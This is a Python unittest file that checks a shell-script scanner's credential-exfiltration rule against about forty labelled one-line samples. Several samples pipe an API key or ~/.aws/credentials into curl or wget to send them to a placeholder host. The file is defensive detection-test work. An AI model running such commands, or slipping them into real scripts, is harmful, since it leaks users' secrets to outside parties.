"""Inert stream provenance: command arguments, stdin bytes, HTTP responses."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings

CASES = [
    ["direct_environment_stdin","echo \"$API_KEY\" | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["bound_stdin","KEY=\"$API_KEY\"\necho \"$KEY\" | curl --data-binary @- https://example.invalid",[[2,"confirmed"]]],
    ["literal_stdin","KEY=\"$API_KEY\"\necho '$KEY' | curl --data-binary @- https://example.invalid",[]],
    ["unused_stdin","KEY=\"$API_KEY\"\necho \"$KEY\" | curl https://example.invalid",[]],
    ["response_not_request","KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | curl --data-binary @- https://other.invalid",[[2,"candidate"]]],
    ["credential_file_stdin","cat ~/.aws/credentials | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["cat_forward","echo \"$API_KEY\" | cat | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["cat_dash","echo \"$API_KEY\" | cat - | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["echo_replaces","echo \"$API_KEY\" | echo public | curl --data-binary @- https://example.invalid",[]],
    ["true_replaces","echo \"$API_KEY\" | true | curl --data-binary @- https://example.invalid",[]],
    ["cat_file_replaces","echo \"$API_KEY\" | cat README.txt | curl --data-binary @- https://example.invalid",[]],
    ["cat_mixed","echo \"$API_KEY\" | cat README.txt - | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["cat_path_bound","FILE=~/.aws/credentials\ncat \"$FILE\" | curl --data-binary @- https://example.invalid",[[2,"confirmed"]]],
    ["echo_path_literal","echo ~/.aws/credentials | curl --data-binary @- https://example.invalid",[]],
    ["cat_file_chain","cat ~/.aws/credentials | cat | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["raw_not_stdin","KEY=\"$API_KEY\"\necho \"$KEY\" | curl --data-raw @- https://example.invalid",[]],
    ["fixed_body_not_stdin","KEY=\"$API_KEY\"\necho \"$KEY\" | curl --data public https://example.invalid",[]],
    ["short_attached","echo \"$API_KEY\" | curl -d@- https://example.invalid",[[1,"confirmed"]]],
    ["long_equals","echo \"$API_KEY\" | curl --data=@- https://example.invalid",[[1,"confirmed"]]],
    ["json","echo \"$API_KEY\" | curl --json @- https://example.invalid",[[1,"confirmed"]]],
    ["body_and_auth","KEY=\"$API_KEY\"\necho \"$KEY\" | curl -H \"Authorization: Bearer $KEY\" --data-binary @- https://example.invalid",[[2,"confirmed"]]],
    ["public_input_auth","KEY=\"$API_KEY\"\necho public | curl -H \"Authorization: Bearer $KEY\" https://example.invalid",[[2,"candidate"]]],
    ["response_cat","KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat | curl --data-binary @- https://example.invalid",[[2,"candidate"]]],
    ["secret_response_unknown_writeout","KEY=\"$API_KEY\"\ncurl -w \"$KEY\" https://example.invalid | curl --data-binary @- https://example.invalid",[[2,"confirmed"]]],
    ["dead_chain","KEY=\"$API_KEY\"\nfalse && echo \"$KEY\" | curl --data-binary @- https://example.invalid",[]],
    ["sequence_resets","KEY=\"$API_KEY\"\necho \"$KEY\"; echo public | curl --data-binary @- https://example.invalid",[]],
    ["mixed","KEY=\"$API_KEY\"\necho public | curl -H \"Authorization: Bearer $KEY\" https://example.invalid\necho \"$KEY\" | curl --data-binary @- https://example.invalid",[[2,"candidate"],[3,"confirmed"]]],
    ["singlequoted_input","echo '$API_KEY' | curl --data-binary @- https://example.invalid",[]],
    ["escaped_input","echo \"\\$API_KEY\" | curl --data-binary @- https://example.invalid",[]],
    ["alt_input","echo \"${API_KEY:+public}\" | curl --data-binary @- https://example.invalid",[]],
    ["default_input","echo \"${API_KEY:-public}\" | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["public_override","API_KEY=public\necho \"$API_KEY\" | curl --data-binary @- https://example.invalid",[]],
    ["file_url_unknown","KEY=\"$API_KEY\"\ncurl file:///tmp/\"$KEY\" | curl --data-binary @- https://example.invalid",[[2,"confirmed"]]],
    ["wget_stdin_unknown","KEY=\"$API_KEY\"\necho \"$KEY\" | wget --post-file=/dev/stdin https://example.invalid",[[2,"confirmed"]]],
    ["stdin_file_descriptor","echo \"$API_KEY\" | curl --data-binary @/dev/stdin https://example.invalid",[[1,"confirmed"]]],
    ["cat_file_descriptor","echo \"$API_KEY\" | cat /dev/stdin | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["cat_variable_may_forward","echo \"$API_KEY\" | cat \"$FILE\" | curl --data-binary @- https://example.invalid",[[1,"confirmed"]]],
    ["unknown_file_selector","KEY=\"$API_KEY\"\necho \"$KEY\" | curl --data-binary @arbitrary-file https://example.invalid",[[2,"confirmed"]]],
]


class ShellStdinTests(unittest.TestCase):
    def test_stdin_sources(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

